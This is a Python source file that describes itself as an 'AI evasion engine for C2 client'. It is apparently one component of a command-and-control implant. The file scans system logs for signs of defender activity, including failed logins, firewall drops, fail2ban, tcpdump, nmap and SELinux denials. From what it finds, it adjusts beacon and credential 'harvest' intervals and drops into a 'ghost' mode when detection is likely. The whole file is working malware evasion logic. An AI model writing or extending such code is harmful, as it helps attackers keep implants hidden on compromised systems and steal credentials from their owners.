"""AI evasion engine for C2 client — rule-based with optional ML fallback."""

from datetime import datetime
from typing import Optional, Dict, List
import os
import json

THREAT_SIGNATURES = [
    "segfault", "permission denied", "authentication failure",
    "failed password", "invalid user", "root login",
    "sudo:", "FAILED SU", "session opened",
    "kernel:.*intrusion", "apparmor.*DENIED", "selinux.*denied",
    "iptables.*DROP", "nftables.*drop",
    "sshd.*invalid", "pam_unix.*authentication failure",
    "fail2ban", "ufw.*BLOCK", "firewalld.*REJECT",
    "process.*killed", "oom-killer", "out of memory",
    "tcpdump", "nmap", "wireshark",
    "audit.*denied", "pam.*error",
]


class AIEvasionEngine:
    """AI evasion engine for C2 client. Works without ML model using rule-based analysis."""

    def __init__(
        self,
        node_id: str = None,
        watermark: str = None,
        model_path: str = None,
    ):
        self.node_id = node_id or "unknown"
        self.watermark = watermark or "unknown"
        self.model = None

    def log_analysis(self, message: str):
        """Record an analysis message (used by credential harvester)."""
        pass  # Non-critical logging hook

    async def analyze_logs(self, log_path: str) -> Dict:
        """Analyze system logs for threats using signature matching."""
        result = {
            "threat_level": "low",
            "threats_detected": [],
            "confidence": 0.5,
            "timestamp": datetime.utcnow().isoformat(),
        }

        if not os.path.exists(log_path):
            return result

        try:
            import re
            with open(log_path, "r", errors="replace") as f:
                lines = f.readlines()

            for line in lines[-1000:]:
                line_lower = line.lower()
                for sig in THREAT_SIGNATURES:
                    if re.search(sig, line_lower):
                        severity = "medium"
                        if any(k in sig for k in ("root login", "FAILED SU", "oom-killer")):
                            severity = "critical"
                        elif any(k in sig for k in ("failed password", "invalid user", "authentication failure")):
                            severity = "high"

                        result["threats_detected"].append({
                            "signature": sig,
                            "severity": severity,
                            "line": line[:200].strip(),
                            "timestamp": datetime.utcnow().isoformat(),
                        })
                        break

            if result["threats_detected"]:
                has_critical = any(t["severity"] == "critical" for t in result["threats_detected"])
                has_high = any(t["severity"] == "high" for t in result["threats_detected"])
                if has_critical:
                    result["threat_level"] = "critical"
                    result["confidence"] = 0.98
                elif has_high:
                    result["threat_level"] = "high"
                    result["confidence"] = 0.95
                else:
                    result["threat_level"] = "medium"
                    result["confidence"] = 0.85

        except Exception as e:
            result["error"] = str(e)

        return result

    async def predict_behavior(self, threat_level: str) -> Dict:
        """Predict optimal evasion behavior based on threat level."""
        modes = {
            "critical": {"behavior": "ghost", "harvest_interval": 10800, "beacon_interval": 180, "confidence": 0.95},
            "high": {"behavior": "aggressive", "harvest_interval": 7200, "beacon_interval": 120, "confidence": 0.85},
            "medium": {"behavior": "moderate", "harvest_interval": 3600, "beacon_interval": 60, "confidence": 0.75},
            "low": {"behavior": "passive", "harvest_interval": 1800, "beacon_interval": 30, "confidence": 0.9},
        }
        mode = modes.get(threat_level, modes["low"])
        return {
            "threat_level": threat_level,
            "behavior": mode["behavior"],
            "harvest_interval": mode["harvest_interval"],
            "beacon_interval": mode["beacon_interval"],
            "evasion_mode": mode["behavior"],
            "confidence": mode["confidence"],
        }

    async def run_evasion(self, log_path: str = None) -> Dict:
        """Run full evasion cycle: analyze logs → predict behavior."""
        if not log_path:
            log_path = "/var/log/syslog"

        result = {
            "status": "success",
            "timestamp": datetime.utcnow().isoformat(),
            "threat_level": "low",
            "predictions": {},
            "analysis": {},
        }

        analysis = await self.analyze_logs(log_path)
        result["analysis"] = analysis
        predictions = await self.predict_behavior(analysis["threat_level"])
        result["predictions"] = predictions
        result["threat_level"] = analysis["threat_level"]

        return result


# Alias for case-mismatch compatibility
AIevasionEngine = AIEvasionEngine
